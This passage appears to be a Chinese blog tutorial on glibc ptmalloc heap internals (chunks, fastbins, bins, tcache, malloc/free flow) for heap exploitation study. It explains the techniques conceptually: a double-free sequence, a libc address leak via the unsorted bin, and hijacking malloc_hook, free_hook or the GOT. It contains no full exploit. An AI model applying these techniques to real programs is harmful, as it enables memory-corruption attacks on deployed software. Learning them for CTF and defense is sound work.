class="hljs-comment">/* Current size in bytes. */</span><br>  <span class="hljs-type">size_t</span> mprotect_size; <span class="hljs-comment">/* Size in bytes that has been mprotected</span><br><span class="hljs-comment">                           PROT_READ|PROT_WRITE.  */</span><br>  <span class="hljs-comment">/* Make sure the following data is properly aligned, particularly</span><br><span class="hljs-comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span><br><span class="hljs-comment">     MALLOC_ALIGNMENT. */</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];<br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>main_arena没有_heap_info，其存在于thread_arena的每个heap的低地址开头，用于解释说明该heap。</p><h2 id="3-chunk和malloc-chunk"><a href="#3-chunk和malloc-chunk" class="headerlink" title="3.chunk和malloc_chunk"></a>3.chunk和malloc_chunk</h2><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构</strong>。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215163401495.png" alt="image-20230215163401495"></p><p>在内存中，prev_size在低地址，bk_nextsize在高地址</p><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</li><li>size，该 chunk 的大小(包括了chunk_header,即prev_size和size)，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li>fd，bk。chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li><li>fd和bk指向的是prev_size位，是chunk_header,不是usr_data,所以p-&gt;fd-&gt;fd 即 p-&gt;fd - 0x18指向的地址单元内的数据(x64 )</li><li>但是，malloc函数返回的指针是指向usr_data的指针，free的也是这个指针</li></ul></li><li>fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215160404418.png" alt="image-20230215160404418"></p><p>如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小</p><ol><li>本身的 size 字段会记录，</li><li>它后面的 chunk 会记录。</li></ol><p><strong>一般情况下</strong>，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。同时，如果被free的chunk上方是top chunk,则该chunk会和top chunk合并。</p><h2 id="4-fastbinsY"><a href="#4-fastbinsY" class="headerlink" title="4.fastbinsY"></a>4.fastbinsY</h2><p>fastbin有10个数组(bin)，每个数组存放一个单向链表，每个链表存放同一个size的chunk，在进行添加删除操作时使用的是LIFO原则</p><p>题外话：为什么使用LIFO？为什么不直接插在链表尾？因为glibc有的只是fastbins[n]这一个指针和被free的chunk的地址，如果要插到链表尾，则需要沿着链表头一直迭代到链表尾，耗时更长</p><p>fastbin是为了减少小内存的切割和合并，提高效率而存在的。<strong>fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 合并。</strong>但是当释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，我们就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。malloc_consolidate 函数可以将 fastbin 中所有能和其它 chunk 合并的 chunk 合并在一起。</p><p>默认情况下，对于size_t为4B的平台， 小于64B的chunk分配请求（最大可以80B，默认56B，即<strong>默认用8个bin</strong>）；对于size_t为8B的平台，小于128B的chunk分配请求(最大可以160B，默认112B)，程序会根据所需的size(<strong>这里指的是数据空间的大小，即去除prev_size和size字段后的大小</strong>)首先到fastbin中去寻找对应大小的bin中是否包含未被使用的chunk，如果有，则直接从bin中返回该chunk。而释放chunk时，也会根据chunk的size参数计算fastbin中对应的index，如果存在对应的大小，就将chunk直接插入对应的bin中。</p><p>tips：<em>32位平台 size_t 长度为 4 字节，64 位平台的 size_t 长度可能是 4 字节，也可能是 8 字节，64 位Linux平台 size_t 长度为 8 字节</em></p><p>32位下，各个fastbin存储的大小为:8,16,24,32,40,48,56,64,72,80</p><p>64位下，各个fastbin存储的大小为:16,32,48,64,80,96,112,128,144,160</p><p>例子：</p><p>在bin中插入chunk时，首先将要插入的chunk的fd修改为此时bin数组中存放的指针值，再将bin数组指向要插入的chunk，我们将bin数组指向的chunk称为链表头，每次插入chunk都插入到链表头，取出chunk也是先从链表头取</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">buff0</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff1</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br><span class="hljs-attribute">buff2</span> <span class="hljs-operator">=</span> malloc（malloc_size)<br>free（buff0）<br>free（buff1）<br>free（buff2）<br></code></pre></td></tr></table></figure><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/8854824-a442c2d04218da5f.webp" alt="8854824-a442c2d04218da5f"></p><p>1.malloc申请fastbin范围内的chunk时，会首先在fastbins中查询对应size的链表头是否为空，若不为空，则继续<strong>检查链表头指向的chunk的size位</strong>，没问题则返回给用户。在利用double free时需要特别注意这一点，最后申请到的目标地址并不是任意的，而是需要一个伪造的chunk。顺带一提，fd指向的是chunk_header的首地址，不是usr_data的首地址。</p><p>2.由于fastbin的机制，在满足fastbin的chunk在被释放后它下一个chunk的P位不会被置为0，也就是说即使当前chunk被释放掉了，但是他的next_chunk的P为还依然为1，导致了chunk能被多次释放，这样做是为了防止chunk被合并，提高效率，但成为了造成double free漏洞的因素之一。</p><p>3.对于fastbin中的chunk，在释放时只会对链表头的chunk进行检验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>如上，释放chunk时会检测该chunk是否是链表头指向的chunk，是则报错</p><p>但是我们可以先free(chunk1)，再free(chunk2),再free(chunk1),这样chunk1就被free了两次，造成了double free漏洞</p><p>针对fastbin的攻击有：</p><ul><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><h2 id="5-bins"><a href="#5-bins" class="headerlink" title="5.bins"></a>5.bins</h2><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/image-20230215210936982.png" alt="image-20230215210936982"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//NBINS = 128，即bins[254]</span><br></code></pre></td></tr></table></figure><ul><li><p>用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p></li><li><p>malloc_state结构体的成员，每两个bins控制一个双向循环链表，第一个bins为fd，指向链表的头结点，第二个bins为bk，指向链表的尾结点，为了方便起见在这里称两个bins为一个BINS，这里一共有127个BINS。</p></li></ul><p><strong>对于bins中的双向链表，当BIN中只有一个chunk时，fd和bk指针都指向链表头，即一个libc的地址，可以用来泄露libc地址。并且由于chunk在大于fast bin时优先进入unsorted bin，进入small bin和large bin的条件较为苛刻，一般是用unsorted bin，其链表头地址为main_arena+88。比较典型的利用可以参考buu babyheap_0ctf_2017</strong></p><h3 id="1-unsorted-bin"><a href="#1-unsorted-bin" class="headerlink" title="1.unsorted bin"></a>1.unsorted bin</h3><h3 id="BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS"><a href="#BINS-0-（即bins-0-bins-1-）为unsorted-bin，占一个BINS" class="headerlink" title="BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS"></a>BINS[0]（即bins[0],bins[1]）为unsorted bin，占一个BINS</h3><p><strong>FIFO</strong>，从头部插入，从尾部取出</p><p>&amp;bins[0]  &#x3D; main_arena + 104        &amp;bins[1] &#x3D; main_arena + 112</p><p>无chunk时，bins[0] &#x3D; bins[1] &#x3D; main_arena + 88  </p><p>只有一个chunk时，bins[0]和bins[1]都指向该chunk，该chunk的fd和bk都指向main_arena+88,该地址处存放top_chunk的地址</p><p>有多个chunk时，尾部的chunk的fd指向main_arena + 0x88</p><p>题外话：如果把bins[0]看作一个chunk的fd，bins[1]看作bk，那么main_arena+88就是这个chunk的prev_size</p><h3 id="2-small-bin"><a href="#2-small-bin" class="headerlink" title="2.small bin"></a>2.small bin</h3><h3 id="BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS"><a href="#BINS-2-BINS-63-（即bins-2-bins-125-）为small-bins，占62个BINS" class="headerlink" title="BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS"></a>BINS[2]-BINS[63]（即bins[2]-bins[125]）为small bins，占62个BINS</h3><p>​链表中chunk的大小与index的关系是<em><em>2</em> size_t</em> index**</p><p>​采用<strong>FIFO(先入先出)算法</strong>：内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的   rear end(尾端)中获取chunk。</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/201907300808254.png" alt="201907300808254"></p><h3 id="3-large-bin"><a href="#3-large-bin" class="headerlink" title="3.large bin"></a>3.large bin</h3><h3 id="BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS"><a href="#BINS-64-BINS-126-（即bins-126-bins-251-）为large-bins，占63个BINS" class="headerlink" title="BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS"></a>BINS[64]-BINS[126]（即bins[126]-bins[251]）为large bins，占63个BINS</h3><p>​大于等于1024字节（0x400）的chunk称之为large chunk</p><ul><li><p>large bin链表的个数为63个，被分为6组。</p></li><li><p>largechunk使用fd_nextsize、bk_nextsize连接起来。</p></li><li><p>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中。</p></li><li><p>large chunk可以添加、删除在large bin的任何一个位置。</p></li><li><p>在这63个largebins中：第一组的32个largebin链依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。第二组的16个largebin链依次以512字节步长为间隔；第三组的8个largebin链以步长4096为间隔；第四组的4个largebin链以32768字节为间隔；第五组的2个largebin链以262144字节为间隔；最后一组的largebin链中的chunk大小无限制。</p></li><li><p>在同一个largebin中：每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个largebin中的所有chunk按照chunksize进行从大到小的排列：最大的chunk放在一个链表的front end，最小的chunk放在rear end；相同大小的chunk按照最近使用顺序排序。</p></li></ul><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/20190730154304263.png" alt="20190730154304263"></p><h2 id="6-堆内存释放"><a href="#6-堆内存释放" class="headerlink" title="6.堆内存释放"></a>6.堆内存释放</h2><p>主要流程在_int_free</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p>（1）根据可用地址获取该地址所在的内存块</p><p> (1.5)各种check，如传入的指向chunk的指针是否16字节对齐(32位下8字节)，size位不能小于MINSIZE，下一个chunk的prev_inuse需要为1</p><p>（2）检查该内存块的大小是否属于 fast chunk范围，若是，则直接放入fast bin；否则（3）<br>（3）检查该内存块标志位M，若为1，则直接使用munmap释放；否则（4）<br>（4）检查相邻的上一个内存块（低地址）是否空闲，若空闲，则合并；<br>（5）检查相邻的下一个内存块是否空闲，若非空闲，则直接加入unsorted bin；若空闲，检查该内存块是否为top chunk，若为top chunk，则合并并修改top chunk的地址和大小；若非top chunk，则合并并添加到unsorted bin<br>（6）对于主Arena，检查top chunk的区域是否超过设定的阈值，若超过，那么就适当地缩减一部分，通过brk将一部分内存还给内核；对于子Arena，则会检查，目前top chunk所在堆的内存是否已经全部释放，若已将全部释放，那就通过munmap将这片内存还给内核。</p><p>可以看出，free内存块一共有4个去向：①放入fast bins ②放入unsorted bin ③合并入top chunk ④直接通过unmap还给内核</p><p>注：主Arena在进行堆的缩减时，首先通过sbrk(0)获取当前的brk的边界，如果brk &#x3D; top起始地址 + top的大小 才会进行缩减，这说明，当top chunk存在于mmap得到的堆时，brk还停留在非mmap得到的堆顶，这就是arena部分所说的这部分内存将永远无法返还给内核的原因。</p><p>堆合并一般思路： </p><p>1.尝试向低地址合并。</p><p>2.尝试向高地址合并，若为topchunk则直接并入topchunk，否则尝试合并后放入unsorted bin</p><h2 id="7-堆内存分配"><a href="#7-堆内存分配" class="headerlink" title="7.堆内存分配"></a>7.堆内存分配</h2><p>主要流程在_int_malloc</p><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibcmalloc和free源码解析</a></p><p><strong>请求的字节数和实际分配的内存大小原则</strong>：</p><p>1.不管是32位还是64位，malloc申请的内存(usr_data+chunk头)都是16字节对齐的</p><p>2.会对下一个chunk的prev_size位进行复用，比如32位下malloc(0x2c),按理来说0x2c+8位chunk头 &gt; 0x30，则chunk_size为0x41，但是由于复用了，chunk_size还是0x31，而malloc(0x2d)，chunk_size就是0x41了</p><p>  所以32位下，glibc2.31（ubuntu1804默认）、2.27,chunk_size &#x3D; malloc_size + 8 - 4     16位向上对齐（即不足16位按16位算）</p><p>  32位下对于   glibc2.23（ubuntu1604默认），chunk_size &#x3D; malloc_size + 8 - 4             8位向上对齐</p><p>  64位下chunk_size &#x3D; malloc_size + 0x10 - 8      16位向上对齐</p><p>  glib中堆内存分配的基本思路就是，首先找到本线程的Arena，然后优先在Arena对应的回收箱中寻找合适大小的内存，在内存箱中所有内存块均小于所需求的大小，那么就会去top chunk分割，但是如果top chunk的大小也不足够，此时不一定要拓展top，检查所需的内存是否大于128k，若大于，则直接使用系统调用mmap分配内存，如果小于，就进行top chunk的拓展，即堆的拓展，拓展完成后，从top chunk中分配内存，剩余部分成为新的top chunk。</p><pre><code class="hljs">1. 检查是否设置了`malloc_hook`，若设置了则跳转进入`malloc_hook`，若未设置则获取当前的分配区，进入`int_malloc`函数。2. 如果当前的分配区为空，则调用`sysmalloc`分配空间，返回指向新`chunk`的指针，否则进入下一步。3. 若用户申请的大小在`fast bin`的范围内，则考虑寻找对应`size`的`fast bin chunk`，判断该`size`的`fast bin`是否为空，不为空则取出第一个`chunk`返回，否则进入下一步。4. 如果用户申请的大小符合`small bin`的范围，则在相应大小的链表中寻找`chunk`，若`small bin`未初始化，则调用`malloc_consolidate`初始化分配器，然后继续下面的步骤，否则寻找对应的`small bin`的链表，如果该`size` 的`small bin`不为空则取出返回，否则继续下面的步骤。如果申请的不在`small bin`的范围那么调用`malloc_consolidate`去合并所有`fast bin`并继续下面的步骤。5. 用户申请的大小符合`large bin`或`small bin`链表为空，开始处理`unsorted bin`链表中的`chunk`。在`unsorted bin`链表中查找符合大小的`chunk`，若用户申请的大小为`small bin`，`unsorted bin`中只有一块chunk并指向`last_remainder`，且`chunk size`的大小大于`size+MINSIZE`，则对当前的`chunk`进行分割，更新分配器中的`last_remainder`，切出的`chunk`返回给用户，剩余的`chunk`回`unsorted bin`。否则进入下一步。6. 将当前的`unsorted bin`中的`chunk`取下，若其`size`恰好为用户申请的`size`，则将`chunk`返回给用户。否则进入下一步7. 获取当前`chunk size`所对应的bins数组中的头指针。（`large bin`需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于`MAX_ITERS`则不在处理。进入下一步。8. 如果用户申请的空间的大小符合`large bin`的范围或者对应的small bin链表为空且`unsorted bin`链表中没有符合大小的`chunk`，则在对应的`large bin`链表中查找符合条件的`chunk`（即其大小要大于用户申请的`size`）。若找到相应的`chunk`则对`chunk`进行拆分，返回符合要求的`chunk`（无法拆分时整块返回）。否则进入下一步。9. 根据`binmap`找到表示更大`size`的`large bin`链表，若其中存在空闲的`chunk`，则将`chunk`拆分之后返回符合要求的部分，并更新`last_remainder`。否则进入下一步。10. 若`top_chunk`的大小大于用户申请的空间的大小，则将`top_chunk`拆分，返回符合用户要求的`chunk`，并更新`last_remainder`，否则进入下一步。11. 若`fast bin`不为空，则调用`malloc_consolidate`合并`fast bin`，重新回到第四步再次从`small bin`搜索。否则进入下一步。12. 调用`sysmalloc`分配空间，`free top chunk`返回指向新`chunk`的指针。13. 若`_int_malloc`函数返回的`chunk`指针为空，且当前分配区指针不为空，则再次尝试`_int_malloc`14. 对`chunk`指针进行检查，主要检查`chunk`是否为`mmap`，且位于当前的分配区内。</code></pre><p>  注：<br>  ①small request是指实际分配的内存块大小属于small chunk范围<br>  ②fast bins合并操作是指，检查fast bins中的所有内存块是否可以和相邻内存块合并，若可以合并，则进行合并，并将合并后的内存块加入到unsorted bin中<br>  ③last remainder是一个目的为更好的利用空间局部性的优化！<br>  ④MINSIZE是指一个内存块的最小大小，即 chunk头的前两个字段所占空间<br>  ⑤遍历unsorted bin 是，并不是找到一个大于当前所需的内存块就返回，是因为遵循“small first，best fit”原则，因为可能存在内存更小，内存块用于分配<br>  ⑥找到合适的内存块后，会将内存块从当前链表中移除<br>  ⑦large chunk是否可以分割取决于剩余的大小是否大于MINSIZE<br>  ⑧binmap是一个用于记录bins中各个bin是否存在有内存块的位图，需要注意，位图中若为空，则表示一定不存在；若非空，则可能存在；<br>  ⑨注意到，内存块的分配是按照对齐来的，并且内存块的分割若不成功，则会返回整个内存块，也就是说，我们得到的内存大小实际上可能大于我们所需要的内存大小的。<br>  ⑩直接使用mmap申请的内存会被标记为M，释放时，也会直接走munp释放给内核</p><h2 id="8-tcache-bin"><a href="#8-tcache-bin" class="headerlink" title="8.tcache bin"></a>8.tcache bin</h2><p>全称thread local caching，glibc 2.26开始引入 ，目的是提高效率，但是牺牲了安全性</p><ul><li><p>单链表，LIFO，后进先出，即存取都在链表头，链表指针为fd字段</p></li><li><p>和fastbin一样，不会被合并，inuse位不会置0</p></li><li><p>tcachebin中的链表指针指向的下一个chunk的<code>fd</code>字段，fastbin中的链表指针指向的是下一个chunk的<code>prev_size</code>字段</p></li><li><p>tcache_perthread_struct结构体中的tcache_entry *entries[TCACHE_MAX_BINS];声明了有64个元素的指针数组，即有64个tcache单链表，每相邻两个链表中的chunk大小相差0x10，所以用户数据部分范围(不考虑复用)是0x10-0x400，chunk_size最大0x410，malloc(&lt;&#x3D;0x408)的chunk都在tcache范围内。32位机器上是以8字节递增，即用户数据范围0x8-0x19c,chunk_size最大0x204，malloc(&lt;&#x3D;0x200)的chunk都在范围内。</p></li><li><p>每个单链表中最多存7个chunk</p></li><li><p>在<code>_int_free</code>中，最开始就先检查chunk的size是否落在了tcache的范围内，且对应的tcache未满，将其放入tcache中。</p></li><li><p>在内存申请的开始部分，调用malloc_hook之后，int_malloc之前，首先会判断申请大小块，在 tcache 是否存在，如果存在就直接从 tcache 中摘取，否则再使用_int_malloc 分配。注：这里没有对size是否符合bin对应的size的验证，可以直接劫持free_hook、malloc_hook、got表等</p><p>在<code>_int_malloc</code>中，</p><p>如果从fastbin中取出了一个块，那么会把该fastbin中剩余的块放入tcache中直至填满tcache（smallbin中也是一样）</p><p>如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会先将其放入到tcachebin中，继续在unsorted bin中遍历，遍历完若tcachebin中有对应大小的chunk，从tcache中取出（最后一个遍历到的chunk），如果在这个遍历的过程中，放入tcache的chunk达到tcache_unsorted_limit，则会直接返回当前遍历到的unsorted chunk。</p></li><li><p>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。如：合并完后的大chunk也会被先放进tcache</p></li><li><p><code>tcache_perthread_struct</code>本身也是一个堆块，大小为<code>0x250</code>，位于堆开头的位置，包含数组<code>counts</code>存放每个<code>bin</code>中的<code>chunk</code>当前数量，以及数组<code>entries</code>存放<code>64</code>个<code>bin</code>的首地址（可以通过<strong>劫持此堆块</strong>进行攻击）。</p></li><li><p>calloc()可越过tcache取chunk</p></li><li><p>可将<code>tcache_count</code>整型溢出为<code>0xff</code>以绕过<code>tcache</code>，直接放入<code>unsorted bin</code>等，但在<code>libc-2.28</code>中，检测了<code>counts</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况，且增加了对<code>double free</code>的检查。</p></li></ul><p>1.<strong>glibc2.26</strong>开始引入(ubuntu17.10) ，但从glibc2.27开始引入了许多针对tcache的保护</p><p>2.27新增：</p><ul><li><code>CVE-2017-17426</code>是<code>libc-2.26</code>存在的漏洞，<code>libc-2.27</code>已经修复</li></ul><p>2.28新增：</p><ul><li>检测了<code>tcache_count</code>溢出变成负数（<code>0x00-1=0xff</code>）的情况</li><li>增加了对<code>double free</code>的检查</li></ul><p>2.29新增：</p><ul><li>在<code>tcache_put</code>和<code>tcache_get</code>中增加了对<code>key</code>的检查，chunk放入tcache后在chunk的开头加了key标识，通过检查key来判断chunk是否已经在tcache中存在，以此检查是否存在<code>double free</code></li></ul><p>2.32新增：</p><ul><li>引入safe_unlink机制，<code>tcache</code>和<code>fastbin</code>的<code>fd</code>指针<code>异或加密</code></li></ul><p>源码(glibc2.26)：</p><p>malloc和free的函数中以及其它也有和tcache相关的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br><br><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> 